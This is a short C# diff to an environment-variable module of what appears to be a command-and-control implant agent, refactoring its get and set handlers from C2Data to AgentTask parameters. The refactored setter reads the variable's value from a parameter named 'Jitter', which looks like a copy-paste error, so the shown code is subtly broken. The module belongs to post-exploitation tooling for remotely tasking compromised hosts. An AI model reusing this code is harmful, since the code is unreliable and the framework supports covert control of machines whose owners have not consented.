@@ -7,7 +7,6 @@ using Shared.Models;
 using System;
 using System.Collections;
 using System.Collections.Generic;
-using System.Linq;
 
 namespace Agent.Modules
 {
@@ -43,7 +42,7 @@ namespace Agent.Modules
             };
         }
 
-        private void GetEnvironmentVariables(string AgentID, C2Data C2Data)
+        void GetEnvironmentVariables(string AgentID, AgentTask Task)
         {
             try
             {
@@ -67,14 +66,12 @@ namespace Agent.Modules
             }
         }
 
-        private void SetEnvironmentVariable(string AgentID, C2Data C2Data)
+        void SetEnvironmentVariable(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-
-                var name = (string)parameters.FirstOrDefault(p => p.Name.Equals("EnvName", StringComparison.OrdinalIgnoreCase)).Value;
-                var value = (string)parameters.FirstOrDefault(p => p.Name.Equals("EnvValue", StringComparison.OrdinalIgnoreCase)).Value;
+                var name = (string)Task.Parameters["Name"];
+                var value = (string)Task.Parameters["Jitter"];
 
                 Environment.SetEnvironmentVariable(name, value, EnvironmentVariableTarget.Process);
             }
